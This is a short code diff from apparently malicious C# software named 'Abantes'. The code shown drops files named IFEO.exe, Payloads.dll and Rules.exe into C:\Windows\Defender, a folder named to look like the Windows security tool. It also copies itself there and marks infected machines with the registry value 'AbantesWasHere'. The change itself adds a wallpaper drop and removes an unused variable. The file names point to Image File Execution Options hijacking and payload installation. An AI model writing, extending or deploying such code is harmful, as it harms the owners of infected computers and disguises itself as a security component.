@@ -22,7 +22,6 @@ namespace Abantes
         {
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
             RegistryKey editKey;
-            string TempPath = Path.GetTempPath();
             string extractPath = @"C:\Windows\Defender";
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
             {
@@ -36,6 +35,7 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                 File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                 File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
+                Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
